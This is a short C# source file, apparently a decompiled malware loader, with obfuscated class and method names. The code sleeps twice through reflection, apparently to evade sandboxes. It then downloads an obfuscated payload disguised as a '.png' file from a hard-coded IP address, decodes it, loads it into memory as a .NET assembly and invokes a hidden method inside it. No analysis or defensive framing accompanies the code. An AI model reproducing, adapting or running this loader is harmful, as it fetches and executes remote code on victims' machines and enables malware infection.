using System;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading;

namespace Rzxabjp;

internal class Works
{
	internal static int Boss()
	{
		typeof(Thread).GetMethod("Sleep", new Type[1] { typeof(int) })!.Invoke(null, new object[1] { 10000 });
		typeof(Thread).GetMethod("Sleep", new Type[1] { typeof(int) })!.Invoke(null, new object[1] { 10000 });
		try
		{
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		}
		catch
		{
		}
		string fullName = AppDomain.CurrentDomain.Load(new BinaryReader(WebRequest.Create("http://35.77.84.215/minus/2511061072xls.png").GetResponse().GetResponseStream()).ReadBytes(86956765).Access()).FullName;
		return Farmer(fullName);
	}

	internal static int Farmer(string name)
	{
		Assembly[] assemblies = Thread.GetDomain().GetAssemblies();
		foreach (Assembly assembly in assemblies)
		{
			if (!(assembly.FullName == name))
			{
				continue;
			}
			Type[] exportedTypes = assembly.GetExportedTypes();
			foreach (Type type in exportedTypes)
			{
				if (!(type.FullName == "Uamnlhegolkefzzmgoliqmwh.Rowpqvcakz"))
				{
					continue;
				}
				MethodInfo[] methods = type.GetMethods();
				foreach (MethodInfo methodInfo in methods)
				{
					if (methodInfo.Name == "Cfajfjqcpf")
					{
						Environment.SpecialFolder specialFolder = (Environment.SpecialFolder)methodInfo.Invoke(null, null);
						return Convert.ToInt32(specialFolder);
					}
				}
			}
		}
		return 1;
	}
}
